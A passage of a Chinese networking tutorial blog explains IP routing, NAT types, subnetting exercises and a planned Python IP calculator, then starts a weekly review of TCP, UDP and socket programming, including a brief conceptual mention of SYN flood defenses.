class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css">目的主机在不同网络<br><br>示例：<br>主机<span class="hljs-selector-tag">A</span>：<span class="hljs-number">192.168</span>.<span class="hljs-number">1.10</span>（网络<span class="hljs-number">1</span>）<br>主机<span class="hljs-selector-tag">B</span>：<span class="hljs-number">10.0</span>.<span class="hljs-number">0.20</span>（网络<span class="hljs-number">2</span>）<br><br>过程：<br><span class="hljs-number">1</span>. <span class="hljs-selector-tag">A</span>想发送给<span class="hljs-selector-tag">B</span><br><span class="hljs-number">2</span>. 检查：<span class="hljs-selector-tag">B</span>不在同一网络<br><span class="hljs-number">3</span>. 查找路由表<br><span class="hljs-number">4</span>. 发送给网关路由器<br><span class="hljs-number">5</span>. 路由器转发<br></code></pre></td></tr></table></figure><hr><h2 id="5-NAT技术"><a href="#5-NAT技术" class="headerlink" title="5. NAT技术"></a>5. NAT技术</h2><h3 id="5-1-为什么需要NAT？"><a href="#5-1-为什么需要NAT？" class="headerlink" title="5.1 为什么需要NAT？"></a>5.1 为什么需要NAT？</h3><p><strong>地址短缺问题</strong>：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">IPv4地址：约<span class="hljs-number">43</span>亿个<br>全球需求：远超<span class="hljs-number">43</span>亿<br><br>私有地址：<br><span class="hljs-number">10.0.0.0</span>/<span class="hljs-number">8</span><br><span class="hljs-number">172.16.0.0</span>/<span class="hljs-number">12</span><br><span class="hljs-number">192.168.0.0</span>/<span class="hljs-number">16</span><br><br>问题：<br>私有地址不能在互联网上路由<br><br>解决方案：<br>NAT（Network Address Translation）<br>网络地址转换<br></code></pre></td></tr></table></figure><h3 id="5-2-NAT工作原理"><a href="#5-2-NAT工作原理" class="headerlink" title="5.2 NAT工作原理"></a>5.2 NAT工作原理</h3><p><strong>基本NAT</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">内部网络：192.168.1.0/24（私有）<br>外部网络：公网地址<br><br>过程：<br><span class="hljs-bullet">1.</span> 内部主机（192.168.1.10）访问互联网<br><span class="hljs-bullet">2.</span> 数据包到达NAT路由器<br><span class="hljs-bullet">3.</span> NAT修改源地址：<br>   192.168.1.10 → 公网地址（如1.2.3.4）<br><span class="hljs-bullet">4.</span> 发送到互联网<br><span class="hljs-bullet">5.</span> 响应返回时，NAT修改目的地址：<br>   1.2.3.4 → 192.168.1.10<br><span class="hljs-bullet">6.</span> 转发给内部主机<br></code></pre></td></tr></table></figure><p><strong>NAPT（端口转换）</strong>：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs dns">NAPT = Network Address Port Translation<br>也称为PAT（Port Address Translation）<br><br>多个内部主机共享一个公网地址<br><br>示例：<br>内部主机<span class="hljs-keyword">A</span>：<span class="hljs-number">192.168.1.10</span>:<span class="hljs-number">5000</span><br>内部主机B：<span class="hljs-number">192.168.1.20</span>:<span class="hljs-number">6000</span><br>公网地址：  <span class="hljs-number">1.2.3.4</span><br><br>NAT表：<br>┌────────────────────┬─────────────────────┐<br>│  内部地址:端口     │  外部地址:端口      │<br>├────────────────────┼─────────────────────┤<br>│ <span class="hljs-number">192.168.1.10</span>:<span class="hljs-number">5000</span>  │ <span class="hljs-number">1.2.3.4</span>:<span class="hljs-number">10000</span>       │<br>│ <span class="hljs-number">192.168.1.20</span>:<span class="hljs-number">6000</span>  │ <span class="hljs-number">1.2.3.4</span>:<span class="hljs-number">10001</span>       │<br>└────────────────────┴─────────────────────┘<br><br>通过端口区分不同的内部主机<br></code></pre></td></tr></table></figure><h3 id="5-3-NAT类型"><a href="#5-3-NAT类型" class="headerlink" title="5.3 NAT类型"></a>5.3 NAT类型</h3><p><strong>Full Cone NAT（完全锥形NAT）</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">特点：<br><span class="hljs-bullet">- </span>内部地址:端口 → 外部地址:端口（固定映射）<br><span class="hljs-bullet">- </span>任何外部主机都可以发送到这个外部端口<br><br>适用：<br><span class="hljs-bullet">- </span>服务器<br><span class="hljs-bullet">- </span>P2P应用<br></code></pre></td></tr></table></figure><p><strong>Restricted Cone NAT（受限锥形NAT）</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">特点：<br><span class="hljs-bullet">- </span>只有内部主机曾发送过数据的外部主机才能回复<br><span class="hljs-bullet">- </span>限制外部IP<br><br>适用：<br><span class="hljs-bullet">- </span>一般客户端<br></code></pre></td></tr></table></figure><p><strong>Port Restricted Cone NAT（端口受限锥形NAT）</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">特点：<br><span class="hljs-bullet">- </span>限制外部IP和端口<br><span class="hljs-bullet">- </span>更严格<br><br>适用：<br><span class="hljs-bullet">- </span>安全性要求高的场景<br></code></pre></td></tr></table></figure><p><strong>Symmetric NAT（对称NAT）</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">特点：<br><span class="hljs-bullet">- </span>每个外部目的地址都有不同的映射<br><span class="hljs-bullet">- </span>最严格<br><br>问题：<br><span class="hljs-bullet">- </span>P2P穿透困难<br></code></pre></td></tr></table></figure><h3 id="5-4-NAT的优缺点"><a href="#5-4-NAT的优缺点" class="headerlink" title="5.4 NAT的优缺点"></a>5.4 NAT的优缺点</h3><p><strong>优点</strong>：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm">✅ 节省公网<span class="hljs-built_in">IP</span>地址<br>✅ 提高安全性（隐藏内部结构）<br>✅ 灵活的网络规划<br></code></pre></td></tr></table></figure><p><strong>缺点</strong>：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">❌ 破坏端到端连接<br>❌ 增加延迟<br>❌ 某些协议不支持（如FTP主动模式）<br>❌ P2P应用需要特殊处理（NAT穿透）<br>❌ 违反分层原则（修改传输层端口）<br></code></pre></td></tr></table></figure><hr><h2 id="6-实战项目：IP地址计算器"><a href="#6-实战项目：IP地址计算器" class="headerlink" title="6. 实战项目：IP地址计算器"></a>6. 实战项目：IP地址计算器</h2><h3 id="6-1-项目需求"><a href="#6-1-项目需求" class="headerlink" title="6.1 项目需求"></a>6.1 项目需求</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs markdown">功能需求：<br><span class="hljs-bullet">1.</span> IP地址信息查询<br><span class="hljs-bullet">   -</span> 地址类型（A/B/C类）<br><span class="hljs-bullet">   -</span> 私有/公网地址<br><span class="hljs-bullet">   -</span> 网络地址<br><span class="hljs-bullet">   -</span> 广播地址<br><span class="hljs-bullet">   -</span> 可用主机范围<br><br><span class="hljs-bullet">2.</span> 子网划分<br><span class="hljs-bullet">   -</span> 根据主机数划分<br><span class="hljs-bullet">   -</span> 根据子网数划分<br><span class="hljs-bullet">   -</span> VLSM计算<br><br><span class="hljs-bullet">3.</span> 子网聚合<br><span class="hljs-bullet">   -</span> 路由聚合计算<br><span class="hljs-bullet">   -</span> CIDR表示<br><br><span class="hljs-bullet">4.</span> 二进制转换<br><span class="hljs-bullet">   -</span> IP地址二进制表示<br><span class="hljs-bullet">   -</span> 子网掩码二进制表示<br><br>技术要求：<br><span class="hljs-bullet">-</span> Python实现<br><span class="hljs-bullet">-</span> 命令行界面<br><span class="hljs-bullet">-</span> 输入验证<br><span class="hljs-bullet">-</span> 友好的输出格式<br></code></pre></td></tr></table></figure><h3 id="6-2-工具演示"><a href="#6-2-工具演示" class="headerlink" title="6.2 工具演示"></a>6.2 工具演示</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># IP地址信息查询</span><br>python day22_ip_calculator.py --ip 192.168.1.10 --mask 255.255.255.0<br><br><span class="hljs-comment"># 子网划分</span><br>python day22_ip_calculator.py --subnet 192.168.1.0/24 --<span class="hljs-built_in">split</span> 4<br><br><span class="hljs-comment"># 路由聚合</span><br>python day22_ip_calculator.py --aggregate 192.168.0.0/24 192.168.1.0/24<br></code></pre></td></tr></table></figure><hr><h2 id="7-今日练习"><a href="#7-今日练习" class="headerlink" title="7. 今日练习"></a>7. 今日练习</h2><h3 id="练习1：地址计算"><a href="#练习1：地址计算" class="headerlink" title="练习1：地址计算"></a>练习1：地址计算</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 计算以下IP地址的网络地址和广播地址：<br><span class="hljs-bullet">   -</span> 172.16.5.130/24<br><span class="hljs-bullet">   -</span> 10.1.2.3/16<br><span class="hljs-bullet">   -</span> 192.168.100.50/27<br><br><span class="hljs-bullet">2.</span> 判断以下地址是否在同一网络：<br><span class="hljs-bullet">   -</span> 192.168.1.10/24 和 192.168.1.20/24<br><span class="hljs-bullet">   -</span> 10.0.0.5/16 和 10.1.0.5/16<br></code></pre></td></tr></table></figure><h3 id="练习2：子网划分"><a href="#练习2：子网划分" class="headerlink" title="练习2：子网划分"></a>练习2：子网划分</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">将192.168.1.0/24划分为：<br><span class="hljs-bullet">1.</span> 4个相等的子网<br><span class="hljs-bullet">2.</span> 2个子网（一个需要100台主机，一个需要50台）<br><span class="hljs-bullet">3.</span> 3个子网（分别需要60、30、15台主机）<br></code></pre></td></tr></table></figure><h3 id="练习3：路由聚合"><a href="#练习3：路由聚合" class="headerlink" title="练习3：路由聚合"></a>练习3：路由聚合</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">聚合以下路由：<br><span class="hljs-number">1</span>. <span class="hljs-number">192.168.0.0</span>/<span class="hljs-number">24</span>, <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span>, <span class="hljs-number">192.168.2.0</span>/<span class="hljs-number">24</span>, <span class="hljs-number">192.168.3.0</span>/<span class="hljs-number">24</span><br><span class="hljs-number">2</span>. <span class="hljs-number">10.0.0.0</span>/<span class="hljs-number">24</span>, <span class="hljs-number">10.0.1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><h3 id="练习4：实战应用"><a href="#练习4：实战应用" class="headerlink" title="练习4：实战应用"></a>练习4：实战应用</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">使用IP计算器工具：<br><span class="hljs-bullet">1.</span> 规划一个企业网络（3个部门）<br><span class="hljs-bullet">2.</span> 分配IP地址段<br><span class="hljs-bullet">3.</span> 配置路由器（模拟）<br></code></pre></td></tr></table></figure><hr><h2 id="8-常见问题"><a href="#8-常见问题" class="headerlink" title="8. 常见问题"></a>8. 常见问题</h2><p><strong>Q1：子网掩码255.255.255.255(&#x2F;32)有什么用？</strong></p><p>A：</p><ul><li>表示单个主机</li><li>主机路由</li><li>用于点对点链路</li><li>用于环回地址</li></ul><p><strong>Q2：为什么要减去2个地址（网络地址和广播地址）？</strong></p><p>A：</p><ul><li>网络地址：标识网络本身，不能分配给主机</li><li>广播地址：发送给所有主机，不能分配给单个主机</li></ul><p><strong>Q3：0.0.0.0&#x2F;0是什么意思？</strong></p><p>A：</p><ul><li>默认路由</li><li>匹配所有地址</li><li>当没有更具体的路由时使用</li></ul><p><strong>Q4：NAT会影响网络游戏吗？</strong></p><p>A：</p><ul><li>会影响</li><li>对称NAT最难穿透</li><li>需要使用STUN、TURN等技术</li><li>或使用UPnP自动映射</li></ul><p><strong>Q5：IPv4地址真的不够用了吗？</strong></p><p>A：</p><ul><li>理论上不够（43亿 &lt; 全球设备数）</li><li>实际上通过NAT缓解</li><li>长期解决方案是IPv6</li></ul><hr><h2 id="9-总结"><a href="#9-总结" class="headerlink" title="9. 总结"></a>9. 总结</h2><p>今天我们学习了：</p><h3 id="核心知识点"><a href="#核心知识点" class="headerlink" title="核心知识点"></a>核心知识点</h3><ol><li><p><strong>IP协议基础</strong>：</p><ul><li>无连接、不可靠、尽力而为</li><li>网络层协议</li><li>负责寻址和路由</li></ul></li><li><p><strong>IPv4地址</strong>：</p><ul><li>32位地址</li><li>点分十进制表示</li><li>A&#x2F;B&#x2F;C&#x2F;D&#x2F;E类地址</li><li>私有地址和特殊地址</li></ul></li><li><p><strong>子网划分</strong>：</p><ul><li>子网掩码</li><li>CIDR表示法</li><li>VLSM</li><li>路由聚合</li></ul></li><li><p><strong>IP报文</strong>：</p><ul><li>20-60字节头部</li><li>关键字段：TTL、Protocol、地址</li><li>IP分片和重组</li></ul></li><li><p><strong>IP路由</strong>：</p><ul><li>路由表</li><li>最长前缀匹配</li><li>直接路由vs间接路由</li></ul></li><li><p><strong>NAT技术</strong>：</p><ul><li>地址转换</li><li>NAPT（端口转换）</li><li>NAT类型</li><li>优缺点</li></ul></li></ol><h3 id="重点回顾"><a href="#重点回顾" class="headerlink" title="重点回顾"></a>重点回顾</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs markdown">IP地址计算公式：<br>网络地址 = IP地址 &amp; 子网掩码<br>广播地址 = 网络地址 | (~子网掩码)<br>主机数量 = 2^(32-前缀长度) - 2<br><br>子网划分步骤：<br><span class="hljs-bullet">1.</span> 确定需要的子网数或主机数<br><span class="hljs-bullet">2.</span> 计算需要的位数<br><span class="hljs-bullet">3.</span> 确定新的前缀长度<br><span class="hljs-bullet">4.</span> 计算子网范围<br><br>路由查找：<br>最长前缀匹配原则<br><br>NAT工作：<br>内部私有地址 ←→ 外部公网地址<br></code></pre></td></tr></table></figure><h3 id="明天预告"><a href="#明天预告" class="headerlink" title="明天预告"></a>明天预告</h3><p><strong>第23天：IPv6详解</strong></p><p>内容预览：</p><ul><li>IPv6地址格式</li><li>IPv6 vs IPv4对比</li><li>IPv6特性和优势</li><li>IPv6过渡技术</li><li>IPv6实践</li></ul><hr><p><strong>继续加油！</strong> 🚀</p><p>今天我们学习了IP协议的基础知识，理解了IP地址、子网划分和路由的原理。这些知识是网络工程师的必备技能。明天我们将学习IPv6，了解下一代互联网协议！</p><p><strong>进度：22&#x2F;180天（12.2%）</strong></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>21天：第三周总结与实战</title>
    <link href="/2025/11/10/21%E5%A4%A9%EF%BC%9A%E7%AC%AC%E4%B8%89%E5%91%A8%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AE%9E%E6%88%98/"/>
    <url>/2025/11/10/21%E5%A4%A9%EF%BC%9A%E7%AC%AC%E4%B8%89%E5%91%A8%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[<h1 id="第21天：第三周总结与实战"><a href="#第21天：第三周总结与实战" class="headerlink" title="第21天：第三周总结与实战"></a>第21天：第三周总结与实战</h1><h2 id="今日目标"><a href="#今日目标" class="headerlink" title="今日目标"></a>今日目标</h2><ul><li>回顾本周核心知识点</li><li>完成综合实战项目</li><li>学习性能优化技巧</li><li>掌握调试和排错方法</li><li>了解常用工具和资源</li></ul><hr><h2 id="1-本周知识回顾"><a href="#1-本周知识回顾" class="headerlink" title="1. 本周知识回顾"></a>1. 本周知识回顾</h2><h3 id="1-1-第15天：TCP协议基础"><a href="#1-1-第15天：TCP协议基础" class="headerlink" title="1.1 第15天：TCP协议基础"></a>1.1 第15天：TCP协议基础</h3><p><strong>核心知识</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs markdown">TCP特点：<br>✅ 面向连接<br>✅ 可靠传输<br>✅ 有序传输<br>✅ 字节流<br>✅ 全双工<br>✅ 流量控制<br>✅ 拥塞控制<br><br>三次握手：<br><span class="hljs-bullet">1.</span> SYN<br><span class="hljs-bullet">2.</span> SYN-ACK<br><span class="hljs-bullet">3.</span> ACK<br><br>四次挥手：<br><span class="hljs-bullet">1.</span> FIN<br><span class="hljs-bullet">2.</span> ACK<br><span class="hljs-bullet">3.</span> FIN<br><span class="hljs-bullet">4.</span> ACK<br><br>11种状态：<br>CLOSED → LISTEN → SYN<span class="hljs-emphasis">_SENT → SYN_</span>RECEIVED →<br>ESTABLISHED → FIN<span class="hljs-emphasis">_WAIT_</span>1 → FIN<span class="hljs-emphasis">_WAIT_</span>2 →<br>CLOSING → TIME<span class="hljs-emphasis">_WAIT → CLOSE_</span>WAIT → LAST<span class="hljs-emphasis">_ACK</span><br></code></pre></td></tr></table></figure><p><strong>关键概念</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">TIME_WAIT：<br><span class="hljs-bullet">- </span>持续2MSL（通常2分钟）<br><span class="hljs-bullet">- </span>确保对方收到ACK<br><span class="hljs-bullet">- </span>防止旧连接的数据包干扰<br><br>SYN Flood攻击：<br><span class="hljs-bullet">- </span>发送大量SYN包<br><span class="hljs-bullet">- </span>不完成三次握手<br><span class="hljs-bullet">- </span>耗尽服务器资源<br><br>防御：<br><span class="hljs-bullet">- </span>SYN Cookie<br><span class="hljs-bullet">- </span>增加半连接队列<br><span class="hljs-bullet">- </span>缩短超时时间<br></code></pre></td></tr></table></figure><h3 id="1-2-第16天：TCP可靠传输机制"><a href="#1-2-第16天：TCP可靠传输机制" class="headerlink" title="1.2 第16天：TCP可靠传输机制"></a>1.2 第16天：TCP可靠传输机制</h3><p><strong>核心知识</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs markdown">可靠性保证：<br><span class="hljs-bullet">1.</span> 序列号和确认号<br><span class="hljs-bullet">2.</span> 超时重传<br><span class="hljs-bullet">3.</span> 快速重传<br><span class="hljs-bullet">4.</span> 滑动窗口<br><span class="hljs-bullet">5.</span> 流量控制<br><span class="hljs-bullet">6.</span> 拥塞控制<br><br>滑动窗口：<br>发送窗口 = min(接收窗口, 拥塞窗口)<br><br>拥塞控制算法：<br><span class="hljs-bullet">-</span> 慢启动（Slow Start）<br><span class="hljs-bullet">-</span> 拥塞避免（Congestion Avoidance）<br><span class="hljs-bullet">-</span> 快速重传（Fast Retransmit）<br><span class="hljs-bullet">-</span> 快速恢复（Fast Recovery）<br><br>RTO计算（Jacobson算法）：<br>SRTT = (1-α) × SRTT + α × RTT<br>RTTVAR = (1-β) × RTTVAR + β × |SRTT-RTT|<br>RTO = SRTT + 4 × RTTVAR<br></code></pre></td></tr></table></figure><p><strong>关键概念</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">TCP Reno vs TCP CUBIC vs BBR：<br><br>TCP Reno：<br><span class="hljs-bullet">- </span>经典算法<br><span class="hljs-bullet">- </span>基于丢包<br><span class="hljs-bullet">- </span>适合低延迟网络<br><br>TCP CUBIC：<br><span class="hljs-bullet">- </span>Linux默认<br><span class="hljs-bullet">- </span>立方增长<br><span class="hljs-bullet">- </span>适合高带宽网络<br><br>BBR：<br><span class="hljs-bullet">- </span>Google开发<br><span class="hljs-bullet">- </span>基于带宽和RTT<br><span class="hljs-bullet">- </span>适合高延迟网络<br></code></pre></td></tr></table></figure><h3 id="1-3-第17天：UDP协议详解"><a href="#1-3-第17天：UDP协议详解" class="headerlink" title="1.3 第17天：UDP协议详解"></a>1.3 第17天：UDP协议详解</h3><p><strong>核心知识</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">UDP特点：<br>✅ 无连接<br>✅ 不可靠<br>✅ 快速<br>✅ 轻量级<br>✅ 支持广播/多播<br><br>UDP头部：8字节<br><span class="hljs-bullet">- </span>源端口（2字节）<br><span class="hljs-bullet">- </span>目标端口（2字节）<br><span class="hljs-bullet">- </span>长度（2字节）<br><span class="hljs-bullet">- </span>校验和（2字节）<br><br>UDP vs TCP：<br>┌────────────┬────────┬────────┐<br>│   特性     │  TCP   │  UDP   │<br>├────────────┼────────┼────────┤<br>│  可靠性    │   ✅   │   ❌   │<br>│  速度      │   慢   │   快   │<br>│  开销      │   大   │   小   │<br>│  连接      │   是   │   否   │<br>│  顺序      │   是   │   否   │<br>└────────────┴────────┴────────┘<br></code></pre></td></tr></table></figure><p><strong>关键概念</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">UDP使用场景：<br><span class="hljs-bullet">- </span>实时音视频（VoIP、视频会议）<br><span class="hljs-bullet">- </span>在线游戏<br><span class="hljs-bullet">- </span>DNS查询<br><span class="hljs-bullet">- </span>DHCP<br><span class="hljs-bullet">- </span>流媒体<br><span class="hljs-bullet">- </span>IoT设备通信<br><br>可靠UDP实现：<br><span class="hljs-bullet">- </span>应用层实现<br><span class="hljs-bullet">- </span>序列号<br><span class="hljs-bullet">- </span>ACK确认<br><span class="hljs-bullet">- </span>超时重传<br><span class="hljs-bullet">- </span>滑动窗口<br></code></pre></td></tr></table></figure><h3 id="1-4-第18天：Socket编程进阶"><a href="#1-4-第18天：Socket编程进阶" class="headerlink" title="1.4 第18天：Socket编程进阶"></a>1.4 第18天：Socket编程进阶</h3><p><strong>核心知识</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs markdown">阻塞 vs 非阻塞：<br>阻塞：等待直到完成<br>非阻塞：立即返回<br><br>IO多路复用：<br><span class="hljs-bullet">-</span> select：跨平台，最多1024个<br><span class="hljs-bullet">-</span> poll：无限制，O(n)<br><span class="hljs-bullet">-</span> epoll：Linux专用，O(1)，最快<br><br>Socket选项：<br><span class="hljs-bullet">-</span> SO<span class="hljs-emphasis">_REUSEADDR：地址重用</span><br><span class="hljs-emphasis">- TCP_</span>NODELAY：禁用Nagle算法<br><span class="hljs-bullet">-</span> SO<span class="hljs-emphasis">_KEEPALIVE：保活机制</span><br><span class="hljs-emphasis">- SO_</span>LINGER：关闭行为<br><br>服务器架构：<br><span class="hljs-bullet">1.</span> 单线程阻塞：简单但慢<br><span class="hljs-bullet">2.</span> 多线程：简单但有限<br><span class="hljs-bullet">3.</span> IO多路复用：高性能<br><span class="hljs-bullet">4.</span> IO多路复用+线程池：最佳<br></code></pre></td></tr></table></figure><p><strong>关键概念</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">C10K问题：<br>10000个并发连接<br><br>解决方案：<br><span class="hljs-bullet">- </span>IO多路复用（epoll）<br><span class="hljs-bullet">- </span>非阻塞IO<br><span class="hljs-bullet">- </span>事件驱动<br><span class="hljs-bullet">- 